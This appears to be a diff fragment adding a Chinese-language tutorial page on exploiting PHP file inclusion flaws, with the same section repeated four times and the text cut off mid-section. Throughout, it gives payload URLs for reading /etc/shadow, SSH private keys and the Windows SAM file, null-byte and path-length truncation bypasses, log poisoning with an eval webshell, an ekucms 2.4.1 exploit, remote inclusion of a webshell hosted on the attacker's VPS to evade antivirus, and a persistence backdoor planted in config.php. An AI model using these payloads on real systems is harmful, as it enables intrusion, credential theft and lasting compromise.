+<li>此时访问测试：<code>http://192.168.1.3/fileinclude/news.php?id=test.txt</code>。将<code>test.txt</code>文件传送给<code>id</code>参数并复制给<code>test</code>变量，然后<code>txt</code>文件被当作<code>php</code>脚本脚本文件执行。</li>
+</ul>
+<p>同时也可以任意包含，根据物理路径读取服务器敏感文件：</p>
+<pre><code>
+# 常见敏感文件l
+http://192.168.1.3/fileinclude/news.php?id=c:\\1.txt
+www.test.com/test.php?test=../../../../../etc/passwod
+www.test.com/test.php?test=/etc/shadow
+www.test.com/test.php?test=/etc/php5/apache2/php.ini
+www.test.com/test.php?test=/etc/mysql/my.cnf
+www.test.com/test.php?test=/etc/apache2/apache2.conf
+------------------------------------------------------------------------------
+windows敏感文件：
+c:\\boot.ini
+# 查看系统版本
+c:\\windows\\system32\\inetsrv\\metabase.xml
+# 查看iis配置文件
+c:\\windows\\repair\\sam
+# 存储系统初次安装的密码
+c:\\program files\\mysql\\my.ini
+# mysql配置文件
+c:\\program files\\mysql\\data\\mysql\\user.myd
+# mysql root密码
+c:\\windows\\php.ini
+# php配置信息
+c:\\windows\\my.ini
+# mysql配置信息
+-------------------------------------------------------------------------------
+/root/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.ssh/id_ras.keystore
+/root/.ssh/known_hosts
+/etc/passwd
+/etc/shadow
+/etc/my.cnf
+/etc/httpd/conf/httpd.conf
+/root/.bash_history
+/root/.mysql_history
+/proc/self/fd/fd[0-9]*(文件标识符)
+/proc/mounts
+/porc/config.gz
+</code></pre>
+<h4 id="附加后缀截断-4">附加后缀截断</h4>
+<p>例如包含读取/etc/passwd文件，网站源码会给一个后缀形成如：/etc/passwd.php,导致无法读取文件内容。具体代码如下，此时该代码存在文件包含漏洞，由于在漏洞利用被包含的文件会被添加上.php后缀，无法直接利用。</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test).'.php';
+?&gt;
+</code></pre>
+<h5 id="绕过方法一00截断-4">绕过方法一：%00截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt%00
+</code></pre>
+<p><mark><strong>注意</strong>：%00截断包含适合php版本&lt;5.3.4，对应版本的配置文件magic_quotes_gps=off，才能够进行绕过，否则%00会被转义。</mark></p>
+<h5 id="绕过方法二文件名附加进行长度截断-4">绕过方法二：文件名附加./././././.进行长度截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt/././././././././././././././././././.
+</code></pre>
+<p><mark>注意：Windows服务器字节长度应大于256，Linux要大于4096</mark></p>
+<h4 id="包含日志拿shell-4">包含日志拿shell</h4>
+<pre><code>#文件包含漏洞读取apache配置文件
+index.php?page=/etc/init.d/httpd
+index.php?page=/etc/httpd/conf/httpd.conf
+#Linux默认访问url的日志
+/var/log/httpd/access_log 
+#网站访问日志无权限访问，但是cms本身会记录错误日志，这种日志可以访问
+</code></pre>
+<h5 id="拿shell步骤-4">拿shell步骤</h5>
+<ol>
+<li>
+<p>访问../file.php?id=1<?php @eval($_POST[a]);?></p>
+</li>
+<li>
+<p>后台在/var/log/httpd/acess_log 会生成带有一句话的日志，相当与将一句话以.log形式写入了网站目录</p>
+</li>
+<li>
+<p>然后根据文件包含漏洞&gt;连接../file.php?file=…/…/…/…/var/log/httpd/acess_log，getshell</p>
+</li>
+</ol>
+<h5 id="实列-4">实列</h5>
+<p>ekucms某版本存在文件包含漏洞</p>
+<ol>
+<li>通过访问该url，将一句话木马写入日志文件中</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/{~eval($_POST[x])}
+</code></pre>
+<ol start="2">
+<li>该日志是以时间日期命名的，用菜刀连接该日志文件，得到shell</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/\..\temp\logs\20_05_18.log
+</code></pre>
+<h4 id="读源代码-4">读源代码</h4>
+<p>直接读取php文件返回的是代码编译解析后的结果，并不能看到源代码。</p>
+<pre><code>http://192.168.1.3/news.php?id=shell.php
+</code></pre>
+<p>直接看会出错，</p>
+<p>此时可以使用封装伪协议读取：</p>
+<pre><code>http://192.168.1.3/news.php?id=php://filter/read=convert.base64-encode/resource=shell.php
+//核心代码：id=php://filter/read=convert.base64-encode/resource=
+//读出源代码，原理是将文件内容进行base64加密，使代码不运行解析，直接读出源代码。
+</code></pre>
+<h4 id="远程文件包含-4">远程文件包含</h4>
+<p>远程文件包含文件名不能为<code>php</code>可解析的扩展名。另外远程文件包含要确保<code>php.ini</code>中<code>allow_url_fopen</code>和<code>allow_url_include</code>状态为<code>on</code>。为躲避杀软将大马放到自己的<code>vps</code>上然后远程包含。<br>
+<img src="https://i.loli.net/2020/10/13/NztbgUdlCrpWDMO.png" alt="1602574661_1_.jpg" loading="lazy"></p>
+<pre><code>http://192.168.1.3/1.php?file=http://www.xxxx.com/1.png
+</code></pre>
+<h5 id="远程包含限制绕过后缀名限制-4">远程包含限制绕过后缀名限制</h5>
+<pre><code>#源代码
+&lt;?php 
+include($_GET['filename'] . &quot;.html&quot;); 
+?&gt;
+</code></pre>
+<p>与本地包含类似，如果源码存在后缀名限制，直接进行远程包含的话会报错如下：<br>
+<img src="https://i.loli.net/2020/10/13/wY8umDG42j5crZ6.png" alt="1602574772_1_.jpg" loading="lazy"></p>
+<p>绕过方法：</p>
+<pre><code>filename=http://www.xxx.com/FI/php.txt?
+filename=http://www.xxx.com/FI/php.txt%23
+filename=http://www.xxxi8.com/FI/php.txt%20
+filename=http://www.xxx.com/FI/php.txt%00
+</code></pre>
+<h5 id="利用远程文件包含进行权限维持-4">利用远程文件包含进行权限维持</h5>
+<p><code>include</code>代码不会报毒。所以我们在<code>getshell</code>后在网站配置文件中写入包含代码(如：<code>config.php,&lt;?php include($_GET['x']);?&gt;</code>管理员一般不会修改配置文件源代码)里面插入文件包含代码。如果目标<code>allow_url_fopen</code>和<code>allow_url_include</code>状态都为<code>on</code>。既可以永久进行远程包含，达到权限维持的目的。</p>
+<h4 id="php文件包含漏洞-5">php文件包含漏洞</h4>
+<p>在开发中，开发人员会将一些重复使用的代码函数汇总放到单个文件中，需要使用某个函数时直接调用此文件。这个调用过程称为文件包含。为了使代码更灵活，将被包含的文件设置为变量用来进行动态调用。这就导致客户端可以调用一个恶意文件，造成文件包含漏洞。文件包含漏洞在php中居多。造成执行任意代码、包含恶意文件控制网站、敏感文件读取等危害</p>
+<h4 id="常见包含函数-5">常见包含函数</h4>
+<ul>
+<li>
+<p><code>include()</code>：执行到include时才包含文件，找不到被包含文件时产生警告，但是脚本继续执行。</p>
+</li>
+<li>
+<p><code>require()</code>：程序一运行就包含文件，找不到被包含的文件产生致命错误，脚本停止运行</p>
+</li>
+<li>
+<p><code>include_once&amp;require_once()</code>：这两个函数行为与<code>include/require</code>类似，区别在于他们只做一次包含，即如果文件中代码已经被包含则不会再次被包含</p>
+</li>
+</ul>
+<h4 id="利用条件-5">利用条件</h4>
+<ol>
+<li>
+<p>程序用include()等文件包含函数通过动态变量的方式引入需要包含的文件</p>
+</li>
+<li>
+<p>用户能够控制该动态变量</p>
+</li>
+<li>
+<p>配置文件php.ini中参数allow_url_fopen=open，此参数默认为open</p>
+</li>
+<li>
+<p>远程包含则需要php.ini中参数allow_url_include=open，此参数默认为close</p>
+</li>
+</ol>
+<h4 id="文件包含-5">文件包含</h4>
+<ol>
+<li>
+<p>本地文件包含：上传带有shell代码的任意格式文件，利用文件包含漏洞将该文件当作脚本格式解析。</p>
+</li>
+<li>
+<p>远程文件包含：在远程服务器上放置大马以此绕过杀软提权</p>
+</li>
+</ol>
+<h4 id="利用方法-5">利用方法</h4>
+<ul>
+<li>
+<p>包含日志文件getshell</p>
+</li>
+<li>
+<p>包含data:或php://input等伪协议</p>
+</li>
+<li>
+<p>若有phpinfo则可以包含临时文件</p>
+</li>
+<li>
+<p>如果一个网站有文件包含但是无法getshell，尝试在旁站上上传图片马，然后进行文件包含拿shell</p>
+</li>
+</ul>
+<h4 id="实例-5">实例</h4>
+<p>假如目标网站有news.php文件，文件内容为：</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test);
+?&gt;
+</code></pre>
+<p>此时该文件存在文件包含漏洞。include函数通过动态变量的方式引入需要包含的文件，若用户能控制该变量；在同级目录下上传test.txt文件,内容为：</p>
+<pre><code>&lt;?php phpinfo()?&gt;
+</code></pre>
+<ul>
+<li>此时访问测试：<code>http://192.168.1.3/fileinclude/news.php?id=test.txt</code>。将<code>test.txt</code>文件传送给<code>id</code>参数并复制给<code>test</code>变量，然后<code>txt</code>文件被当作<code>php</code>脚本脚本文件执行。</li>
+</ul>
+<p>同时也可以任意包含，根据物理路径读取服务器敏感文件：</p>
+<pre><code>
+# 常见敏感文件l
+http://192.168.1.3/fileinclude/news.php?id=c:\\1.txt
+www.test.com/test.php?test=../../../../../etc/passwod
+www.test.com/test.php?test=/etc/shadow
+www.test.com/test.php?test=/etc/php5/apache2/php.ini
+www.test.com/test.php?test=/etc/mysql/my.cnf
+www.test.com/test.php?test=/etc/apache2/apache2.conf
+------------------------------------------------------------------------------
+windows敏感文件：
+c:\\boot.ini
+# 查看系统版本
+c:\\windows\\system32\\inetsrv\\metabase.xml
+# 查看iis配置文件
+c:\\windows\\repair\\sam
+# 存储系统初次安装的密码
+c:\\program files\\mysql\\my.ini
+# mysql配置文件
+c:\\program files\\mysql\\data\\mysql\\user.myd
+# mysql root密码
+c:\\windows\\php.ini
+# php配置信息
+c:\\windows\\my.ini
+# mysql配置信息
+-------------------------------------------------------------------------------
+/root/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.ssh/id_ras.keystore
+/root/.ssh/known_hosts
+/etc/passwd
+/etc/shadow
+/etc/my.cnf
+/etc/httpd/conf/httpd.conf
+/root/.bash_history
+/root/.mysql_history
+/proc/self/fd/fd[0-9]*(文件标识符)
+/proc/mounts
+/porc/config.gz
+</code></pre>
+<h4 id="附加后缀截断-5">附加后缀截断</h4>
+<p>例如包含读取/etc/passwd文件，网站源码会给一个后缀形成如：/etc/passwd.php,导致无法读取文件内容。具体代码如下，此时该代码存在文件包含漏洞，由于在漏洞利用被包含的文件会被添加上.php后缀，无法直接利用。</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test).'.php';
+?&gt;
+</code></pre>
+<h5 id="绕过方法一00截断-5">绕过方法一：%00截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt%00
+</code></pre>
+<p><mark><strong>注意</strong>：%00截断包含适合php版本&lt;5.3.4，对应版本的配置文件magic_quotes_gps=off，才能够进行绕过，否则%00会被转义。</mark></p>
+<h5 id="绕过方法二文件名附加进行长度截断-5">绕过方法二：文件名附加./././././.进行长度截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt/././././././././././././././././././.
+</code></pre>
+<p><mark>注意：Windows服务器字节长度应大于256，Linux要大于4096</mark></p>
+<h4 id="包含日志拿shell-5">包含日志拿shell</h4>
+<pre><code>#文件包含漏洞读取apache配置文件
+index.php?page=/etc/init.d/httpd
+index.php?page=/etc/httpd/conf/httpd.conf
+#Linux默认访问url的日志
+/var/log/httpd/access_log 
+#网站访问日志无权限访问，但是cms本身会记录错误日志，这种日志可以访问
+</code></pre>
+<h5 id="拿shell步骤-5">拿shell步骤</h5>
+<ol>
+<li>
+<p>访问../file.php?id=1<?php @eval($_POST[a]);?></p>
+</li>
+<li>
+<p>后台在/var/log/httpd/acess_log 会生成带有一句话的日志，相当与将一句话以.log形式写入了网站目录</p>
+</li>
+<li>
+<p>然后根据文件包含漏洞&gt;连接../file.php?file=…/…/…/…/var/log/httpd/acess_log，getshell</p>
+</li>
+</ol>
+<h5 id="实列-5">实列</h5>
+<p>ekucms某版本存在文件包含漏洞</p>
+<ol>
+<li>通过访问该url，将一句话木马写入日志文件中</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/{~eval($_POST[x])}
+</code></pre>
+<ol start="2">
+<li>该日志是以时间日期命名的，用菜刀连接该日志文件，得到shell</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/\..\temp\logs\20_05_18.log
+</code></pre>
+<h4 id="读源代码-5">读源代码</h4>
+<p>直接读取php文件返回的是代码编译解析后的结果，并不能看到源代码。</p>
+<pre><code>http://192.168.1.3/news.php?id=shell.php
+</code></pre>
+<p>直接看会出错，</p>
+<p>此时可以使用封装伪协议读取：</p>
+<pre><code>http://192.168.1.3/news.php?id=php://filter/read=convert.base64-encode/resource=shell.php
+//核心代码：id=php://filter/read=convert.base64-encode/resource=
+//读出源代码，原理是将文件内容进行base64加密，使代码不运行解析，直接读出源代码。
+</code></pre>
+<h4 id="远程文件包含-5">远程文件包含</h4>
+<p>远程文件包含文件名不能为<code>php</code>可解析的扩展名。另外远程文件包含要确保<code>php.ini</code>中<code>allow_url_fopen</code>和<code>allow_url_include</code>状态为<code>on</code>。为躲避杀软将大马放到自己的<code>vps</code>上然后远程包含。<br>
+<img src="https://i.loli.net/2020/10/13/NztbgUdlCrpWDMO.png" alt="1602574661_1_.jpg" loading="lazy"></p>
+<pre><code>http://192.168.1.3/1.php?file=http://www.xxxx.com/1.png
+</code></pre>
+<h5 id="远程包含限制绕过后缀名限制-5">远程包含限制绕过后缀名限制</h5>
+<pre><code>#源代码
+&lt;?php 
+include($_GET['filename'] . &quot;.html&quot;); 
+?&gt;
+</code></pre>
+<p>与本地包含类似，如果源码存在后缀名限制，直接进行远程包含的话会报错如下：<br>
+<img src="https://i.loli.net/2020/10/13/wY8umDG42j5crZ6.png" alt="1602574772_1_.jpg" loading="lazy"></p>
+<p>绕过方法：</p>
+<pre><code>filename=http://www.xxx.com/FI/php.txt?
+filename=http://www.xxx.com/FI/php.txt%23
+filename=http://www.xxxi8.com/FI/php.txt%20
+filename=http://www.xxx.com/FI/php.txt%00
+</code></pre>
+<h5 id="利用远程文件包含进行权限维持-5">利用远程文件包含进行权限维持</h5>
+<p><code>include</code>代码不会报毒。所以我们在<code>getshell</code>后在网站配置文件中写入包含代码(如：<code>config.php,&lt;?php include($_GET['x']);?&gt;</code>管理员一般不会修改配置文件源代码)里面插入文件包含代码。如果目标<code>allow_url_fopen</code>和<code>allow_url_include</code>状态都为<code>on</code>。既可以永久进行远程包含，达到权限维持的目的。</p>
+<h4 id="php文件包含漏洞-6">php文件包含漏洞</h4>
+<p>在开发中，开发人员会将一些重复使用的代码函数汇总放到单个文件中，需要使用某个函数时直接调用此文件。这个调用过程称为文件包含。为了使代码更灵活，将被包含的文件设置为变量用来进行动态调用。这就导致客户端可以调用一个恶意文件，造成文件包含漏洞。文件包含漏洞在php中居多。造成执行任意代码、包含恶意文件控制网站、敏感文件读取等危害</p>
+<h4 id="常见包含函数-6">常见包含函数</h4>
+<ul>
+<li>
+<p><code>include()</code>：执行到include时才包含文件，找不到被包含文件时产生警告，但是脚本继续执行。</p>
+</li>
+<li>
+<p><code>require()</code>：程序一运行就包含文件，找不到被包含的文件产生致命错误，脚本停止运行</p>
+</li>
+<li>
+<p><code>include_once&amp;require_once()</code>：这两个函数行为与<code>include/require</code>类似，区别在于他们只做一次包含，即如果文件中代码已经被包含则不会再次被包含</p>
+</li>
+</ul>
+<h4 id="利用条件-6">利用条件</h4>
+<ol>
+<li>
+<p>程序用include()等文件包含函数通过动态变量的方式引入需要包含的文件</p>
+</li>
+<li>
+<p>用户能够控制该动态变量</p>
+</li>
+<li>
+<p>配置文件php.ini中参数allow_url_fopen=open，此参数默认为open</p>
+</li>
+<li>
+<p>远程包含则需要php.ini中参数allow_url_include=open，此参数默认为close</p>
+</li>
+</ol>
+<h4 id="文件包含-6">文件包含</h4>
+<ol>
+<li>
+<p>本地文件包含：上传带有shell代码的任意格式文件，利用文件包含漏洞将该文件当作脚本格式解析。</p>
+</li>
+<li>
+<p>远程文件包含：在远程服务器上放置大马以此绕过杀软提权</p>
+</li>
+</ol>
+<h4 id="利用方法-6">利用方法</h4>
+<ul>
+<li>
+<p>包含日志文件getshell</p>
+</li>
+<li>
+<p>包含data:或php://input等伪协议</p>
+</li>
+<li>
+<p>若有phpinfo则可以包含临时文件</p>
+</li>
+<li>
+<p>如果一个网站有文件包含但是无法getshell，尝试在旁站上上传图片马，然后进行文件包含拿shell</p>
+</li>
+</ul>
+<h4 id="实例-6">实例</h4>
+<p>假如目标网站有news.php文件，文件内容为：</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test);
+?&gt;
+</code></pre>
+<p>此时该文件存在文件包含漏洞。include函数通过动态变量的方式引入需要包含的文件，若用户能控制该变量；在同级目录下上传test.txt文件,内容为：</p>
+<pre><code>&lt;?php phpinfo()?&gt;
+</code></pre>
+<ul>
+<li>此时访问测试：<code>http://192.168.1.3/fileinclude/news.php?id=test.txt</code>。将<code>test.txt</code>文件传送给<code>id</code>参数并复制给<code>test</code>变量，然后<code>txt</code>文件被当作<code>php</code>脚本脚本文件执行。</li>
+</ul>
+<p>同时也可以任意包含，根据物理路径读取服务器敏感文件：</p>
+<pre><code>
+# 常见敏感文件l
+http://192.168.1.3/fileinclude/news.php?id=c:\\1.txt
+www.test.com/test.php?test=../../../../../etc/passwod
+www.test.com/test.php?test=/etc/shadow
+www.test.com/test.php?test=/etc/php5/apache2/php.ini
+www.test.com/test.php?test=/etc/mysql/my.cnf
+www.test.com/test.php?test=/etc/apache2/apache2.conf
+------------------------------------------------------------------------------
+windows敏感文件：
+c:\\boot.ini
+# 查看系统版本
+c:\\windows\\system32\\inetsrv\\metabase.xml
+# 查看iis配置文件
+c:\\windows\\repair\\sam
+# 存储系统初次安装的密码
+c:\\program files\\mysql\\my.ini
+# mysql配置文件
+c:\\program files\\mysql\\data\\mysql\\user.myd
+# mysql root密码
+c:\\windows\\php.ini
+# php配置信息
+c:\\windows\\my.ini
+# mysql配置信息
+-------------------------------------------------------------------------------
+/root/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.ssh/id_ras.keystore
+/root/.ssh/known_hosts
+/etc/passwd
+/etc/shadow
+/etc/my.cnf
+/etc/httpd/conf/httpd.conf
+/root/.bash_history
+/root/.mysql_history
+/proc/self/fd/fd[0-9]*(文件标识符)
+/proc/mounts
+/porc/config.gz
+</code></pre>
+<h4 id="附加后缀截断-6">附加后缀截断</h4>
+<p>例如包含读取/etc/passwd文件，网站源码会给一个后缀形成如：/etc/passwd.php,导致无法读取文件内容。具体代码如下，此时该代码存在文件包含漏洞，由于在漏洞利用被包含的文件会被添加上.php后缀，无法直接利用。</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test).'.php';
+?&gt;
+</code></pre>
+<h5 id="绕过方法一00截断-6">绕过方法一：%00截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt%00
+</code></pre>
+<p><mark><strong>注意</strong>：%00截断包含适合php版本&lt;5.3.4，对应版本的配置文件magic_quotes_gps=off，才能够进行绕过，否则%00会被转义。</mark></p>
+<h5 id="绕过方法二文件名附加进行长度截断-6">绕过方法二：文件名附加./././././.进行长度截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt/././././././././././././././././././.
+</code></pre>
+<p><mark>注意：Windows服务器字节长度应大于256，Linux要大于4096</mark></p>
+<h4 id="包含日志拿shell-6">包含日志拿shell</h4>
+<pre><code>#文件包含漏洞读取apache配置文件
+index.php?page=/etc/init.d/httpd
+index.php?page=/etc/httpd/conf/httpd.conf
+#Linux默认访问url的日志
+/var/log/httpd/access_log 
+#网站访问日志无权限访问，但是cms本身会记录错误日志，这种日志可以访问
+</code></pre>
+<h5 id="拿shell步骤-6">拿shell步骤</h5>
+<ol>
+<li>
+<p>访问../file.php?id=1<?php @eval($_POST[a]);?></p>
+</li>
+<li>
+<p>后台在/var/log/httpd/acess_log 会生成带有一句话的日志，相当与将一句话以.log形式写入了网站目录</p>
+</li>
+<li>
+<p>然后根据文件包含漏洞&gt;连接../file.php?file=…/…/…/…/var/log/httpd/acess_log，getshell</p>
+</li>
+</ol>
+<h5 id="实列-6">实列</h5>
+<p>ekucms某版本存在文件包含漏洞</p>
+<ol>
+<li>通过访问该url，将一句话木马写入日志文件中</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/{~eval($_POST[x])}
+</code></pre>
+<ol start="2">
+<li>该日志是以时间日期命名的，用菜刀连接该日志文件，得到shell</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/\..\temp\logs\20_05_18.log
+</code></pre>
+<h4 id="读源代码-6">读源代码</h4>
+<p>直接读取php文件返回的是代码编译解析后的结果，并不能看到源代码。</p>
+<pre><code>http://192.168.1.3/news.php?id=shell.php
+</code></pre>
+<p>直接看会出错，</p>
+<p>此时可以使用封装伪协议读取：</p>
+<pre><code>http://192.168.1.3/news.php?id=php://filter/read=convert.base64-encode/resource=shell.php
+//核心代码：id=php://filter/read=convert.base64-encode/resource=
+//读出源代码，原理是将文件内容进行base64加密，使代码不运行解析，直接读出源代码。
+</code></pre>
+<h4 id="远程文件包含-6">远程文件包含</h4>
+<p>远程文件包含文件名不能为<code>php</code>可解析的扩展名。另外远程文件包含要确保<code>php.ini</code>中<code>allow_url_fopen</code>和<code>allow_url_include</code>状态为<code>on</code>。为躲避杀软将大马放到自己的<code>vps</code>上然后远程包含。<br>
+<img src="https://i.loli.net/2020/10/13/NztbgUdlCrpWDMO.png" alt="1602574661_1_.jpg" loading="lazy"></p>
+<pre><code>http://192.168.1.3/1.php?file=http://www.xxxx.com/1.png
+</code></pre>
+<h5 id="远程包含限制绕过后缀名限制-6">远程包含限制绕过后缀名限制</h5>
+<pre><code>#源代码
+&lt;?php 
+include($_GET['filename'] . &quot;.html&quot;); 
+?&gt;
+</code></pre>
+<p>与本地包含类似，如果源码存在后缀名限制，直接进行远程包含的话会报错如下：<br>
+<img src="https://i.loli.net/2020/10/13/wY8umDG42j5crZ6.png" alt="1602574772_1_.jpg" loading="lazy"></p>
+<p>绕过方法：</p>
+<pre><code>filename=http://www.xxx.com/FI/php.txt?
+filename=http://www.xxx.com/FI/php.txt%23
+filename=http://www.xxxi8.com/FI/php.txt%20
+filename=http://www.xxx.com/FI/php.txt%00
+</code></pre>
+<h5 id="利用远程文件包含进行权限维持-6">利用远程文件包含进行权限维持</h5>
+<p><code>include</code>代码不会报毒。所以我们在<code>getshell</code>后在网站配置文件中写入包含代码(如：<code>config.php,&lt;?php include($_GET['x']);?&gt;</code>管理员一般不会修改配置文件源代码)里面插入文件包含代码。如果目标<code>allow_url_fopen</code>和<code>allow_url_include</code>状态都为<code>on</code>。既可以永久进行远程包含，达到权限维持的目的。</p>
+<h4 id="php文件包含漏洞-7">php文件包含漏洞</h4>
+<p>在开发中，开发人员会将一些重复使用的代码函数汇总放到单个文件中，需要使用某个函数时直接调用此文件。这个调用过程称为文件包含。为了使代码更灵活，将被包含的文件设置为变量用来进行动态调用。这就导致客户端可以调用一个恶意文件，造成文件包含漏洞。文件包含漏洞在php中居多。造成执行任意代码、包含恶意文件控制网站、敏感文件读取等危害</p>
+<h4 id="常见包含函数-7">常见包含函数</h4>
+<ul>
+<li>
+<p><code>include()</code>：执行到include时才包含文件，找不到被包含文件时产生警告，但是脚本继续执行。</p>
+</li>
+<li>
+<p><code>require()</code>：程序一运行就包含文件，找不到被包含的文件产生致命错误，脚本停止运行</p>
+</li>
+<li>
+<p><code>include_once&amp;require_once()</code>：这两个函数行为与<code>include/require</code>类似，区别在于他们只做一次包含，即如果文件中代码已经被包含则不会再次被包含</p>
+</li>
+</ul>
+<h4 id="利用条件-7">利用条件</h4>
+<ol>
+<li>
+<p>程序用include()等文件包含函数通过动态变量的方式引入需要包含的文件</p>
+</li>
+<li>
+<p>用户能够控制该动态变量</p>
+</li>
+<li>
+<p>配置文件php.ini中参数allow_url_fopen=open，此参数默认为open</p>
+</li>
+<li>
+<p>远程包含则需要php.ini中参数allow_url_include=open，此参数默认为close</p>
+</li>
+</ol>
+<h4 id="文件包含-7">文件包含</h4>
+<ol>
+<li>
+<p>本地文件包含：上传带有shell代码的任意格式文件，利用文件包含漏洞将该文件当作脚本格式解析。</p>
+</li>
+<li>
+<p>远程文件包含：在远程服务器上放置大马以此绕过杀软提权</p>
+</li>
+</ol>
+<h4 id="利用方法-7">利用方法</h4>
+<ul>
+<li>
+<p>包含日志文件getshell</p>
+</li>
+<li>
+<p>包含data:或php://input等伪协议</p>
+</li>
+<li>
+<p>若有phpinfo则可以包含临时文件</p>
+</li>
+<li>
+<p>如果一个网站有文件包含但是无法getshell，尝试在旁站上上传图片马，然后进行文件包含拿shell</p>
+</li>
+</ul>
+<h4 id="实例-7">实例</h4>
+<p>假如目标网站有news.php文件，文件内容为：</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test);
+?&gt;
+</code></pre>
+<p>此时该文件存在文件包含漏洞。include函数通过动态变量的方式引入需要包含的文件，若用户能控制该变量；在同级目录下上传test.txt文件,内容为：</p>
+<pre><code>&lt;?php phpinfo()?&gt;
+</code></pre>
+<ul>
+<li>此时访问测试：<code>http://192.168.1.3/fileinclude/news.php?id=test.txt</code>。将<code>test.txt</code>文件传送给<code>id</code>参数并复制给<code>test</code>变量，然后<code>txt</code>文件被当作<code>php</code>脚本脚本文件执行。</li>
+</ul>
+<p>同时也可以任意包含，根据物理路径读取服务器敏感文件：</p>
+<pre><code>
+# 常见敏感文件l
+http://192.168.1.3/fileinclude/news.php?id=c:\\1.txt
+www.test.com/test.php?test=../../../../../etc/passwod
+www.test.com/test.php?test=/etc/shadow
+www.test.com/test.php?test=/etc/php5/apache2/php.ini
+www.test.com/test.php?test=/etc/mysql/my.cnf
+www.test.com/test.php?test=/etc/apache2/apache2.conf
+------------------------------------------------------------------------------
+windows敏感文件：
+c:\\boot.ini
+# 查看系统版本
+c:\\windows\\system32\\inetsrv\\metabase.xml
+# 查看iis配置文件
+c:\\windows\\repair\\sam
+# 存储系统初次安装的密码
+c:\\program files\\mysql\\my.ini
+# mysql配置文件
+c:\\program files\\mysql\\data\\mysql\\user.myd
+# mysql root密码
+c:\\windows\\php.ini
+# php配置信息
+c:\\windows\\my.ini
+# mysql配置信息
+-------------------------------------------------------------------------------
+/root/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.ssh/id_ras.keystore
+/root/.ssh/known_hosts
+/etc/passwd
+/etc/shadow
+/etc/my.cnf
+/etc/httpd/conf/httpd.conf
+/root/.bash_history
+/root/.mysql_history
+/proc/self/fd/fd[0-9]*(文件标识符)
+/proc/mounts
+/porc/config.gz
+</code></pre>
+<h4 id="附加后缀截断-7">附加后缀截断</h4>
+<p>例如包含读取/etc/passwd文件，网站源码会给一个后缀形成如：/etc/passwd.php,导致无法读取文件内容。具体代码如下，此时该代码存在文件包含漏洞，由于在漏洞利用被包含的文件会被添加上.php后缀，无法直接利用。</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test).'.php';
+?&gt;
+</code></pre>
+<h5 id="绕过方法一00截断-7">绕过方法一：%00截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt%00
+</code></pre>
+<p><mark><strong>注意</strong>：%00截断包含适合php版本&lt;5.3.4，对应版本的配置文件magic_quotes_gps=off，才能够进行绕过，否则%00会被转义。</mark></p>
+<h5 id="绕过方法二文件名附加进行长度截断-7">绕过方法二：文件名附加./././././.进行长度截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt/././././././././././././././././././.
+</code></pre>
+<p><mark>注意：Windows服务器字节长度应大于256，Linux要大于4096</mark></p>
+<h4 id="包含日志拿shell-7">包含日志拿shell</h4>
+<pre><code>#文件包含漏洞读取apache配置文件
+index.php?page=/etc/init.d/httpd
+index.php?page=/etc/httpd/conf/httpd.conf
+#Linux默认访问url的日志
+/var/log/httpd/access_log 
+#网站访问日志无权限访问，但是cms本身会记录错误日志，这种日志可以访问
+</code></pre>
+<h5 id="拿shell步骤-7">拿shell步骤</h5>
+<ol>
+<li>
+<p>访问../file.php?id=1<?php @eval($_POST[a]);?></p>
+</li>
+<li>
+<p>后台在/var/log/httpd/acess_log 会生成带有一句话的日志，相当与将一句话以.log形式写入了网站目录</p>
+</li>
+<li>
+<p>然后根据文件包含漏洞&gt;连接../file.php?file=…/…/…/…/var/log/httpd/acess_log，getshell</p>
+</li>
+</ol>
+<h5 id="实列-7">实列</h5>
+<p>ekucms某版本存在文件包含漏洞</p>
+<ol>
+<li>通过访问该url，将一句话木马写入日志文件中</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/{~eval($_POST[x])}
+</code></pre>
+<ol start="2">
+<li>该日志是以时间日期命名的，用菜刀连接该日志文件，得到shell</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/\..\temp\logs\20_05_18.log
+</code></pre>
+<h4 id="读源代码-7">读源代码</h4>
+<p>直接读取php文件返回的是代码编译解析后的结果，并不能看到源代码。</p>
+<pre><code>http://192.168.1.3/news.php?id=shell.php
+</code></pre>
+<p>直接看会出错，</p>
+<p>此时可以使用封装伪协议读取：</p>
+<pre><code>http://192.168.1.3/news.php?id=php://filter/read=convert.base64-encode/resource=shell.php
+//核心代码：id=php://filter/read=convert.base64-encode/resource=
+//读出源代码，原理是将文件内容进行base64加密，使代码不运行解析，直接读出源代码。
+</code></pre>
+<h4 id="远程文件包含-7">远程文件包含</h4>
+<p>远程文件包含文件名不能为<code>php</code>可解析的扩展名。另外远程文件包含要确保<code>php.ini</code>中<code>allow_url_fopen</code>和<code>allow_url_include</code>状态为<code>on</code>。为躲避杀软将大马放到自己的<code>vps</code>上然后远程包含。<br>
